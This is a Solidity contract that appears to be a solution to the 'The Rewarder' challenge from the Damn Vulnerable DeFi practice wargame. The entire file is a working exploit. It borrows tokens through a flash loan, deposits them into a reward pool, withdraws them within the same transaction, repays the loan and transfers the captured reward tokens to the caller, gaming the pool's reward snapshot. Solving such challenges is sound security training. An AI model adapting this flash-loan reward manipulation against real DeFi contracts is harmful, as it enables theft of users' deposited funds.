// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "../DamnValuableToken.sol";
import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";
import "./RewardToken.sol";

import "hardhat/console.sol";

contract RewardReceiver {
    
    using Address for address;

    DamnValuableToken public immutable liquidityToken;
    
    FlashLoanerPool public immutable pool;
    TheRewarderPool public immutable rewardPool;
    RewardToken public immutable rewardToken;    


    constructor(address tokenAddress, address poolAddress, address rewardPoolAddress, address rewardTokenAddress){
        liquidityToken = DamnValuableToken(tokenAddress);
        pool = FlashLoanerPool(poolAddress);
        rewardPool = TheRewarderPool(rewardPoolAddress);
        rewardToken = RewardToken(rewardTokenAddress);
    }

    function receiveFlashLoan(uint256 amount) external {

        liquidityToken.approve(address(rewardPool), amount);
        rewardPool.deposit(amount);
        // rewardPool.distributeRewards();
        rewardPool.withdraw(amount);
        require(liquidityToken.transfer(msg.sender, amount), "couldn't pay back");

    }

    function executeFlashloan(uint256 amount) external {
        pool.flashLoan(amount);
    }

    function withdraw() external {
        uint256 amount = rewardToken.balanceOf(address(this));
        // console.log(amount);
        rewardToken.transfer(msg.sender, amount);
    }
}